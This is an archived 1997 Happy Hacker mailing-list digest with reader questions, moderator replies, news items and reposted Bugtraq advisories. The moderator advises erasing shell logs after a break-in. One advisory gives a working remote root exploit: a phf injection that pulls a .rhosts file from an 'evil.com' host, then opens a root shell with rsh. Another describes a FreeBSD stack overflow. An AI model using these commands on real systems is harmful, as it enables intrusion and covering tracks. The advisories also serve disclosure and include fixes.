@@ -1,0 +1,399 @@
+This is a moderated list for discussions of *legal* hacking. Moderator is 
+Carolyn Meinel. Please don't send us anything you wouldn't email to your 
+friendly neighborhood narc, OK? Send posts to cmeinel@techbroker.com. Better 
+yet, 
+To subscribe or unsubscribe, use the subscribe boxes on the menubar. If you decide you just want to 
+use the forum and not get these mailings, I promise my feelings won't get 
+hurt if you unsubscribe from this list. 
+Happy hacking -- and ne auderis delere orbem rigidum meum! 
+---------------------------------------------------------
+
+Moderator: OK, the interview with three of us Happy Hacksters (Jerry, 
+Patrick and Carolyn) is *finally* up at http://verbosity.wiw.org.
+
+If you have been having trouble with looog delays using our Hackers forum at 
+http://www.infowar.com/cgi-shl/login.exe, it's because the Infowar site has 
+become insanely popular. Webwarrior tells us that "Our site was referenced 
+in the New York times last week and we also 
+received the Hot Site award from USA Today."
+
+As Infowar tries to keep up with fame, Webwarrior is in the process of 
+increasing the Infowar site's capacity by a factor of three. Until then, 
+please be patient and continue posting to our Hackers forum there. Remember, 
+post to this Happy Hacker Digest and only 1500 hackers, narcs and 
+journalists will read your stuff. But post to the Infowar Hackers forum and 
+hundred of thousands of lurkers can pop out their eyes seeing what us 
+hackers are up to. 
+****** 
+From: j-roc@juno.com (s j johnson)
+
+If you want to get rid of all those annoying Juno ads, its so easy it's 
+funny.  All you have to do is delete the file in your root directory 
+named "resource.jno" and create another one that is 1 byte that is read only.
+
+From: friend@home.com
+
+Hello, 
+I have found something called RFC's.  Let me explain.  It means Request For 
+ Comments.  RFC's are assigned numbers that are used to identify a particular 
+ protocol or standard.  An example, IP is assigned number 791, and 
+consequently the document is know as RFC 791.  Numbers assigned to the RCFs 
+reflect the chronological order in which they were published.
+
+Access to RFCs is made available to the public through using email or ftp. 
+Start by learning more.  Send the following E-mail to rfc-info@isi.edu, 
+using the following format: 
+To: rfc-info@isi.edu 
+Subject: getting rfcs
+
+help: ways_to_get_rfcs
+
+In response to this message, you get an E-mail detailing ways by which you 
+can gain access to the RFCs. 
+Thanks 
+--Knave
+
+(Moderator's note: all serious hackers study RFCs. How do you think I manage 
+to trick lots of you into thinking I'm 31337? I read RFCs.)
+
+williamw@cei.net
+
+I know this is completely off the subject but i would like to know if any 
+of you would be willing to tell me what i should read, to learn the fine 
+art of hacking.  I am currently ready books on win95, NT, Unix, Linux, and 
+visual basic 4 pro and am attempting to learn programming with vis bas 4 
+pro. please email at the above address so as not to take up space here. 
+thank you for  your time.
+
+From: Bryce Lynch <bryce@telerama.lm.com>
+
+> OHHHH About Linux Slackware OK I am having the same problem How do you 
+> quit minicom without quitting it? I dial into the server I get the charters 
+> on the screen the how or what buttons should I push to get to the # prompt?
+
+OK.  If you do an <Alt-Z> on your console, you'll pull up a menu of 
+hotkey functions minicom will respond to.  You'll see 'X', exit Minicom, 
+but that ISN'T what you want.  What you're looking for is 'Q', quit 
+Minicom and don't reset modem.  If you reset the modem, you'll lose your 
+link, so use <Alt+Q> to leave the connection active while exiting the 
+program.
+
+>  I was looking around telnet://talentcom.com:15 and I got 
+> something weird. I'd just sit there and nothing would happen. However, if 
+> I held down control and pressed various letters, I would get the 
+> following line: 
+>  load: 0.35  cmd: telnet.real 9509 [netcon] 0.03u 0.03s 0% 0k 
+> Do you know what it means? And do you know of any cool places to port surf?
+
+If you load /etc/services into your favorite text editor or just cat it 
+through 'more', you'll see a list of every port a Unix can understand, 
+what it does, the protocol layer it monitors, and maybe some comments. 
+What port 15 does is it responds with network statistics, like the load 
+the processor of the system is running, what method is being used to 
+access that process (in your example, a direct telnet session), kilobytes 
+of memory that process is addressing, and suchlike.
+
+(Moderator: what he means by "cat it through 'more' is to give the command: 
+->more /etc/services/ 
+On some Unix systems you can also give the command: 
+->less /etc/services 
+This is actually an obscure programmers' joke. See if you can find the 
+difference in the two commands.)
+
+From: "Enrique F. Azuara" <eazuara@scanda.com.mx> 
+Subject: what to delete after a hack?????
+
+howdy: 
+i was wondering what logs or files should be modified in a unix system after 
+a hack. I want to start my first hack but i need to know what not to do.
+
+BTW does anyone know if hacking is illegal in Mexico??, are here any groups, 
+clubs, or something to share a drink or two?
+
+see ya 
+henry jr.
+
+(Moderator: Above all, don't erase the system files. Elite hackers do no 
+harm. Period! There is nothing that gives hackers a worse name than 
+essentially destroying a computer system. What happens is that Joe or Jane 
+Blow Cracker breaks in, then gets scared, then just rms EVERYTHING in a 
+panic. Then when Joe or Jane gets caught, (s)he is in REAL trouble because 
+of all that rming. If (s)he had just erased shell log files (s)he would have 
+been better off. Now if you think erasing everything in sight is enough to 
+keep you out of trouble, watch out because you could be wrong. How do you 
+think we learned so much about the Gray Areas Liberation Front attack on the 
+box hosting the Happy Hacker list despite their having rmed everything in 
+sight? Try a traceroute to your intended victim computer sometime. Even if 
+you use a dialup, do you think you can hide your tracks *everywhere*?)
+
+(Anonymous post: second generation hacking!)
+
+I am a seasoned hacker and a father of two.  My older child, a ten- year- 
+old, has a good bit of experience with computers, and I feared that she may 
+get caught hacking one day.  Then I discovered your newsletter.
+
+Since then, I have had her read every issue.  She devours it, and has tried 
+every last (legal) idea.  She also had a pornographic site residing in 
+Germany taken off of the net.
+
+Thank you for providing an entertaining list, and for saving my daughter's 
+freedom.
+
+From: Intervention <intervention@imt.net> 
+X-Sender: Intervention <intervention@imt.net>
+
+ I got a quick question for you, ok?
+
+I was prefix scanning the local university and I found a lot of 
+carriers.  The one problem is that I have no clue what kind of systems 
+they are.  When I connect I get this prompt.
+
+<login>:
+
+It's either that or something really close, I could not quite remember. 
+I have tried a lot of default user names and passwords for Unix VAX/VMS 
+and other various systems.  Let me know what your insight is, thank you.
+
+                                                burn*
+
+From: Kenn Evitt <cpe2@gte.net> 
+Subject: linux slackware
+
+i understood how to use minicom with the pppd daemon to open a PPP 
+connection, but how can i do this and connect to a specific DNS host?
+
+From: "J Leane" <commando@hartingdale.com.au>
+
+Hi IM new to happy hacker... 
+Any ideas on hacking bbs's??
+
+From: Keith Bostic <bostic@bsdi.com> 
+Subject: Excerpted: Edupage, 30 January 1997
+
+Forwarded-by: Rob Kolstad <kolstad@BSDI.COM> 
+Forwarded-by: educom@elanor.oit.unc.edu
+
+SURFING FOR PORN, PAYING IN PHONE BILLS 
+A scam on the Internet has cost some Canadian victims up to $1,200 to 
+download pornography from certain Web sites.  In the scam, surfers are 
+told that looking at nude pictures is free but that a "special image 
+viewer" must be clicked on and downloaded to your computer.  The viewer 
+is actually a virus that disconnects your modem from the regular local 
+Internet service provider and surreptitiously reconnects the call to a 
+number in Moldavia, in the former Soviet Union, generating long-distance 
+charges.  Canadian federal police have ordered that all calls from Canada 
+to the number in Moldavia not be connected.  (Toronto Star 29 Jan 97)
+
+E-MAIL FORGER FACES JAIL TERM 
+A former Oracle employee faces up to six years in prison for perjury, 
+falsification of evidence, and breaking into a computer network, because she 
+forged an e-mail message to support her charge that she was terminated from 
+the company for breaking up a personal relationship with the company's chief 
+executive.  (Atlanta Journal-Constitution 29 Jan 97)
+
+From: burncy@mail1.nai.net (Burn-Cycle) 
+Subject: Re: Welcome to Happy Hacker
+
+I use windows 95 and I use a really good telnet program...I think. Only 
+because I've read thing that hackers have written and they have said that 
+they can't only do certain stuff with a shell account. Well, I can do 
+everything they can do with my telnet program..........i think. Only things 
+that I've tried, have all worked for me. Anyway, I don't get something. I 
+know that when you finger someone you get the location of their password 
+file right?
+
+ya know it looks something like this..
+
+etc\usr\bin
+
+something like that. But what do you do next, ya know. Cause me I'm trying to 
+hack into my own comp and I want to see if my password is easy to get. But I 
+just don't understand what people will do next. Ya know, I heard all you 
+saying well, I got this far, but how did ya do it, and what did ya do.....???
+
+I'm thinking of setting up a server and I want to know if my computer has 
+good security. Thanks for all the help. Check out your server! EXCELLENT!!
+
+------------------------------------------------------------------------- 
+ ____  ___ __ _____  ____ _       _______ _______ __    ______ 
+|    \|   |  |     \|    | |     /     \ |   /   \  |  |      | 
+|  /  |   |  |  /  /|    | |  __ |   |_| |  /  |_|  |  |    -- 
+|    /|   |  |    / |      | /_/ |   | \   /   | |  |  |      | 
+|    \|      |    \ |      |     |   |_ | ||   |_|  |  |      | 
+|  /  |      |  \  \| |    |     |   | || ||   | |  |__/\   -- 
+\  ___/\____/|___\__\_|____|     \_____/|_|\_____/______/___  | 
+ \/                                                         \/ 
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+                   THE UNDERGROUND SOCIETY 
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+  
+              http://w3.nai.net/~bobrob/burn.htm
+
+-------------------------------------------------------------------------
+
+(Moderator: I keep on getting email from guys saying "Puleeze, please, 
+please tell me how to break into computers!!!!" OK, the following exploits 
+are for those guys. But I'll bet they can't figure out how to use them. 
+Meanwhile, in case I'm wrong, all you guys out there with FreeBSD had better 
+install the patches offered below before a herd of clueless newbies goes 
+rming their ways through your computers.)
+
+Approved-By: aleph1@UNDERGROUND.ORG 
+Date:  Sun, 2 Feb 1997 23:54:54 -0600 
+Reply-To: tqbf@enteract.com 
+Sender: Bugtraq List <BUGTRAQ@netspace.org> 
+From: "Thomas H. Ptacek" <tqbf@enteract.com> 
+Subject:      Critical Security Problem in 4.4BSD crt0 
+X-cc:         freebsd-security@freebsd.org 
+To: BUGTRAQ@netspace.org
+
+There is a critically important security problem in FreeBSD 2.1.5's C 
+runtime support library that will enable anyone with control of the 
+environment of a process to cause it to execute arbitrary code. All 
+executable SUID programs on the system are vulnerable to this problem.
+
+The issue is that FreeBSD 2.1.5's crt0.c start() routine, which calls the 
+"main()" entry point function in the program that is starting, will under 
+some circumstances call routines that set the "locale" of the program. The 
+routines that do this are heavily dependent on environment variables, 
+which are in some circumstances copied directly into local character 
+buffers on the stack of the locale routines.
+
+An immediately exploitable problem is evident in 
+"startup_setrunelocale()", which, if certain environment variables are 
+set, will copy the value of "PATH_LOCALE" directly into a 1024 byte buffer 
+on the routine's stack. An attacker simply needs to insert machine code 
+and virtual memory addresses into the "PATH_LOCALE" variable, enable 
+startup locale processing, and run an SUID program.
+
+On FreeBSD 2.1.5, startup locale processing is enabled by setting the 
+environment variable "ENABLE_STARTUP_LOCALE". "startup_setrunelocale()" is 
+called if the environment variable "LC_CTYPE" is set as well.
+
+An exploit to this problem was written in less than 5 minutes. It's a 
+completely typical stack overrun. There is at least one report of 
+individuals actively exploiting this problem on the net.
+
+FreeBSD 2.2-BETA, as well as OpenBSD, seem to have this problem resolved. 
+FreeBSD's crt0 start() function does not process locales and is thus not 
+vulnerable to this problem. I have seen no announcements from the FreeBSD 
+team about 2.2's resolution to the problem, or 2.1.5's vulnerability, and 
+can only assume that they are unaware of it.
+
+Thanks to Michael Scher at U.S. Host for information about this problem.
+
+---------------- 
+Thomas Ptacek at EnterAct, L.L.C., Chicago, IL [tqbf@enteract.com] 
+---------------- 
+"I'm standing alone, I'm watching you all, I'm seeing you sinking."
+
+Approved-By: aleph1@UNDERGROUND.ORG 
+Date:  Mon, 3 Feb 1997 19:48:17 -0000 
+Reply-To: Lex Spoon <sspoon@CLEMSON.EDU> 
+Sender: Bugtraq List <BUGTRAQ@netspace.org> 
+From: Lex Spoon <sspoon@CLEMSON.EDU> 
+Subject:      Re: [H-BUGTRAQ] Critical Security Problem in 4.4BSD crt0 
+X-To:         brucec@HUMBUG.ORG.AU 
+To: BUGTRAQ@netspace.org
+
+>   From: A Bruce in the land of the Bruces <brucec@HUMBUG.ORG.AU> 
+> 
+>   On Sun, 2 Feb 1997, Thomas H. Ptacek wrote: 
+> 
+>   > There is a critically important security problem in FreeBSD 2.1.5's C 
+>   > runtime support library that will enable anyone with control of the 
+>   > environment of a process to cause it to execute arbitrary code. All 
+>   > executable SUID programs on the system are vulnerable to this problem. 
+>   > 
+>   > On FreeBSD 2.1.5, startup locale processing is enabled by setting the 
+>   > environment variable "ENABLE_STARTUP_LOCALE". "startup_setrunelocale()" is 
+>   > called if the environment variable "LC_CTYPE" is set as well. 
+> 
+>   Quick fix (for shell users), 'declare -r' all suspect environment 
+>   variables to safe values in the system startup files for the shell. 
+>
+
+This doesn't completely close the hole.  In the following snippet, 
+/bin/sh is /bin/bash, in case that matters:
+
+        $ export FOO=short 
+        $ echo $FOO 
+        short 
+        $ declare -r FOO 
+        $ FOO=oaeundoautnhdoaeunthdoaeuthdoautnhd 
+        bash: FOO: read-only variable 
+        $ env FOO=oaeutnhdoeutnhdunthadutnohadoatnuehd  sh 
+        $ echo $FOO 
+        oaeutnhdoeutnhdunthadutnohadoatnuehd 
+        $
+
+lex
+
+Approved-By: aleph1@UNDERGROUND.ORG 
+X-Sender: miro@piglet.cc.utexas.edu 
+Date:  Mon, 3 Feb 1997 21:20:22 -0600 
+Reply-To: Miroslav Pikus <miro@ccwf.cc.utexas.edu> 
+Sender: Bugtraq List <BUGTRAQ@netspace.org> 
+From: Miroslav Pikus <miro@ccwf.cc.utexas.edu> 
+Subject:      Linux rcp bug 
+To: BUGTRAQ@netspace.org
+
+When playing around with rcp on Linux, we found something interesting, 
+that we haven't seen mentioned on Bugtraq before:
+
+SUMMARY: Root privileges can be obtained by user nobody with uid 65535 by 
+exploiting a problem with /usr/bin/rcp. Many applications are running as 
+'nobody', in particular the NCSA httpd server, which by default executes 
+all cgi-bin scripts under this uid.
+
+PLATFORMS: We tested this only on Linux Red Hat 4.0 and Linux Slackware 3.1
+
+EXPLOIT: This is kind of simple:
+
+root[11:20][504]~# su - nobody 
+[nobody@slip-70-8 /]$ id 
+uid=65535(nobody) gid=65535 
+[nobody@slip-70-8 /]$ rcp oberheim@moe.cc.utexas.edu:brb /tmp/test 
+[nobody@slip-70-8 /]$ ls -la /tmp/test 
+-rw-------   1 root     65535           0 Jan 29 11:20 /tmp/test
+
+But then of course this is unrealistic, since regular users don't usually 
+have access to the 'nobody' account. The password is usually disabled by 
+'*', the login directory is /dev/null, etc.. However some applications do 
+run under uid 65535, and if they can be made to execute rcp, root 
+privileges can be obtained by anyone.
+
+For example NCSA httpd server forks processes under uid 'nobody' after it 
+gets executed by root, so any cgi-script which can execute rcp can be used 
+to gain root access. In particular, do you remember the old problem in the 
+phf cgi-bin script ? If a newline character is passed to the phf script, 
+it can execute arbitrary programs as user 'nobody'. So the problem with 
+rcp can be exploited remotely, and root access can be gained from outside, 
+for instance like this:
+
+$ echo "+ +" > /tmp/my.rhosts 
+$ echo "GET /cgi-bin/phf?Qalias=x%0arcp+hacker@evil.com:/tmp/my.rhosts+ 
+/root/.rhosts" | nc -v - 20 victim.com 80 
+$ rsh -l root victim.com "/bin/sh -i" 
+#
+
+The fact that this bug can be exploited remotely makes it, I think, quite 
+serious. We wrote a simple script that searched our home domains (*.cz and 
+*.sk) for machines that could potentially be attacked this way, and we found 
+about 20 machines after a short scan.
+
+By looking at the source code for rcp, we noticed that that setuid() 
+function for user 65535 issues -1 error signal and so rcp, after opening 
+the ports as root, fails to setuid() back to 65535.
+
+QUICK FIX: change uid of user 'nobody' to something else than 65535. '99' 
+is used by default on RedHat 4.0 for instance.. 
+ 
+
+Cau,
+
+Miro Pikus, miro@mail.utexas.edu, http://ccwf.cc.utexas.edu/~miro/ 
+Rudo Betak, betak@crick.fmed.uniba.sk
+
+Carolyn Meinel 
+M/B Research -- The Technology Brokers 
